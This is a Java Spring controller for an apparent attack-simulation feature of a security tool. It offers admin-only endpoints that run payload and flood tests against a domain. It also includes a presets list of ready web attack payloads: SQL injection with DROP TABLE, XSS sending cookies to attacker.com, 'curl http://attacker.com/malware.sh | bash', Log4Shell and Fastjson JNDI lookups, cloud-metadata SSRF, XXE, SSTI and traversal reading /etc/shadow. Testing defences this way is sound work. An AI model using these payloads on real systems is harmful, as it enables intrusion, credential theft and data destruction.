package com.krish.sentinel_guard.controller;

import com.krish.sentinel_guard.model.ThreatType;
import com.krish.sentinel_guard.model.UserRole;
import com.krish.sentinel_guard.service.AttackSimulationService;
import jakarta.validation.Valid;
import jakarta.validation.constraints.NotBlank;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.security.core.Authentication;
import org.springframework.web.bind.annotation.*;

import java.util.List;
import java.util.Map;

@RestController
@RequestMapping("/api/simulation")
@PreAuthorize("hasRole('SUPER_ADMIN')")
public class SimulationController {

    private final AttackSimulationService simulationService;

    public SimulationController(AttackSimulationService simulationService) {
        this.simulationService = simulationService;
    }

    public record AttackTestRequest(
        ThreatType threatType,
        String targetDomain,
        @NotBlank(message = "Payload is required") String payload,
        String clientIp
    ) {}

    public record FloodTestRequest(
        String targetDomain,
        int requestCount
    ) {}

    @PostMapping("/attack")
    public ResponseEntity<AttackSimulationService.SimulationResult> testAttack(
            @Valid @RequestBody AttackTestRequest request,
            Authentication authentication) {

        String username = authentication != null ? authentication.getName() : "krishna";
        ThreatType type = request.threatType() != null ? request.threatType() : ThreatType.SQL_INJECTION;

        AttackSimulationService.SimulationResult result = simulationService.runAttackTest(
            username,
            UserRole.ROLE_SUPER_ADMIN,
            type,
            request.targetDomain(),
            request.payload(),
            request.clientIp()
        );

        return ResponseEntity.ok(result);
    }

    @PostMapping("/flood")
    public ResponseEntity<AttackSimulationService.FloodSimulationResult> testFlood(
            @RequestBody FloodTestRequest request,
            Authentication authentication) {

        String username = authentication != null ? authentication.getName() : "krishna";
        String domain = request.targetDomain() != null ? request.targetDomain() : "usertesting.singamsettikrishna.in";
        int count = request.requestCount() > 0 ? request.requestCount() : 50;

        AttackSimulationService.FloodSimulationResult result = simulationService.runDdosFloodTest(
            username,
            UserRole.ROLE_SUPER_ADMIN,
            domain,
            count
        );

        return ResponseEntity.ok(result);
    }

    @GetMapping("/presets")
    public ResponseEntity<List<Map<String, String>>> getAttackPresets() {
        return ResponseEntity.ok(List.of(
            // SQL Injection
            Map.of("category", "SQL_INJECTION", "title", "Classic Tautology Authentication Bypass", "payload", "admin' OR '1'='1' --", "description", "Attempts boolean tautology to bypass credential checks"),
            Map.of("category", "SQL_INJECTION", "title", "UNION SELECT Data Extraction", "payload", "' UNION SELECT null, username, password_hash FROM user_accounts --", "description", "Extracts sensitive user hashes via multi-set query union"),
            Map.of("category", "SQL_INJECTION", "title", "Destructive Stacked DDL Query", "payload", "'; DROP TABLE audit_logs; --", "description", "Executes multiple queries in stack to drop critical database tables"),
            Map.of("category", "SQL_INJECTION", "title", "Blind Time-Based PostgreSQL Sleep", "payload", "1' AND (SELECT 1 FROM (SELECT(pg_sleep(5)))a) --", "description", "Attempts time-based exfiltration using database sleep primitives"),

            // XSS
            Map.of("category", "XSS", "title", "Stored Cross-Site Script Injection", "payload", "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>", "description", "Attempts session cookie hijacking via script tag"),
            Map.of("category", "XSS", "title", "SVG Vector with Inline OnLoad Handler", "payload", "<svg/onload=alert('XSS_VULNERABILITY_FOUND')>", "description", "Bypasses standard HTML parsers with SVG event attributes"),
            Map.of("category", "XSS", "title", "JavaScript URI Scheme Execution", "payload", "javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>", "description", "Injects active JavaScript protocol into link attributes"),

            // RCE
            Map.of("category", "REMOTE_CODE_EXECUTION", "title", "Linux Shell Pipe Command Injection", "payload", "| cat /etc/passwd", "description", "Attempts to read root system passwd file via piped command execution"),
            Map.of("category", "REMOTE_CODE_EXECUTION", "title", "Remote Payload Stager Download & Run", "payload", "; curl http://attacker.com/malware.sh | bash", "description", "Downloads external malware script and pipes to bash runtime"),
            Map.of("category", "REMOTE_CODE_EXECUTION", "title", "Log4j / JNDI LDAP Lookups", "payload", "${jndi:ldap://attacker.com/exploit}", "description", "Triggers Log4Shell remote code execution lookup"),
            Map.of("category", "REMOTE_CODE_EXECUTION", "title", "Spring SpEL Expression Injection", "payload", "T(java.lang.Runtime).getRuntime().exec('whoami')", "description", "Evaluates arbitrary Java runtime processes via Expression Language"),

            // SSRF
            Map.of("category", "SSRF", "title", "AWS EC2 IMDSv1 Cloud Metadata Exfiltration", "payload", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "description", "Probes AWS metadata IP to exfiltrate IAM role secrets"),
            Map.of("category", "SSRF", "title", "GCP Compute Internal Metadata Probe", "payload", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", "description", "Attempts GCP cloud compute service account token theft"),
            Map.of("category", "SSRF", "title", "Loopback Hex & Obscure Protocol Bypass", "payload", "gopher://0x7f000001:6379/_flushall", "description", "Attempts Redis cache flush via gopher protocol to localhost"),

            // XXE
            Map.of("category", "XXE", "title", "XML External Entity Local File Disclosure", "payload", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "description", "Injects inline DTD to read server /etc/passwd file"),
            Map.of("category", "XXE", "title", "XInclude XML Entity Parsing Probe", "payload", "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/shadow\" parse=\"text\"/></root>", "description", "Exploits XML parser with XInclude href resolution"),

            // SSTI
            Map.of("category", "SSTI", "title", "Jinja2 Python Subclass RCE Sandbox Escape", "payload", "{{ ''.__class__.__mro__[1].__subclasses__()[133]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip() }}", "description", "Traverses Python object hierarchy in Jinja2 to execute shell commands"),
            Map.of("category", "SSTI", "title", "FreeMarker Template Process Execution", "payload", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "description", "Instantiates FreeMarker execution utility to spawn shell"),
            Map.of("category", "SSTI", "title", "Generic Mathematical SSTI Probe ({{7*7}})", "payload", "{{7*7}}", "description", "Standard template injection canary test"),

            // NoSQL & LDAP
            Map.of("category", "NOSQL_INJECTION", "title", "MongoDB JSON Operator Authentication Bypass", "payload", "{\"username\": \"admin\", \"password\": {\"$ne\": \"invalid_pass\"}}", "description", "Uses MongoDB $ne operator to bypass equality password check"),
            Map.of("category", "NOSQL_INJECTION", "title", "MongoDB $where JavaScript Code Evaluation", "payload", "{\"$where\": \"function() { return (this.status == 'ACTIVE') }\"}", "description", "Executes arbitrary JavaScript engine inside MongoDB server"),
            Map.of("category", "LDAP_INJECTION", "title", "LDAP Filter Wildcard Admin Bypass", "payload", "admin*)(|(password=*))", "description", "Injects LDAP parenthesis to satisfy search filter condition"),

            // Deserialization & Prototype Pollution
            Map.of("category", "DESERIALIZATION_ATTACK", "title", "Fastjson @type Remote JNDI Deserialization", "payload", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com:1389/Exploit\",\"autoCommit\":true}", "description", "Exploits polymorphic deserialization to trigger JNDI connection"),
            Map.of("category", "PROTOTYPE_POLLUTION", "title", "JavaScript __proto__ Object Pollution", "payload", "{\"__proto__\": {\"isAdmin\": true, \"role\": \"ROLE_SUPER_ADMIN\"}}", "description", "Pollutes global JavaScript prototype to escalate privileges"),

            // CRLF & Path Traversal
            Map.of("category", "CRLF_INJECTION", "title", "HTTP Response Splitting & Set-Cookie Injection", "payload", "%0d%0aSet-Cookie:%20session_admin=hijacked_token_123;%20Domain=.singamsettikrishna.in", "description", "Injects CRLF newline bytes to split HTTP response headers"),
            Map.of("category", "PATH_TRAVERSAL", "title", "Directory Traversal to Sensitive Files", "payload", "../../../../etc/shadow", "description", "Escapes web root to read system cryptographic password hashes"),
            Map.of("category", "PATH_TRAVERSAL", "title", "URL Encoded Traversal (%2e%2e%2f)", "payload", "%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fsystem32%2fcalc.exe", "description", "Uses double URL encoding to bypass basic path filters")
        ));
    }
}
